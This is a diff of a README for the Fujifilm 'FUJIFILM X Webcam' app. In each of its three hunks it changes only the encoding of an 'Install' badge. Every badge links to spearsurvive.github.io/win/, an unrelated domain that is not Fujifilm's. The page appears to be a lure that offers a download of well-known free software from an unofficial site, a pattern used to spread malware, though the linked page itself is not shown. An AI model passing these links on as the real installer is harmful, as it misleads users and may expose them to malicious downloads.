@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FUJIFILM X Webcam](https://img.shields.io/badge/⬇_Install_FUJIFILM%20X%20Webcam-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM X Webcam](https://img.shields.io/badge/⬇_Install_FUJIFILM+X+Webcam-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ FUJIFILM X Webcam is a free application that turns compatible Fujifilm X-series 
 
 <div align="center">
 
-[![⬇ Install FUJIFILM X Webcam](https://img.shields.io/badge/⬇_Install_FUJIFILM%20X%20Webcam-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM X Webcam](https://img.shields.io/badge/⬇_Install_FUJIFILM+X+Webcam-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ FUJIFILM X Webcam is a free application that turns compatible Fujifilm X-series 
 
 <div align="center">
 
-[![⬇ Install FUJIFILM X Webcam](https://img.shields.io/badge/⬇_Install_FUJIFILM%20X%20Webcam-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM X Webcam](https://img.shields.io/badge/⬇_Install_FUJIFILM+X+Webcam-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
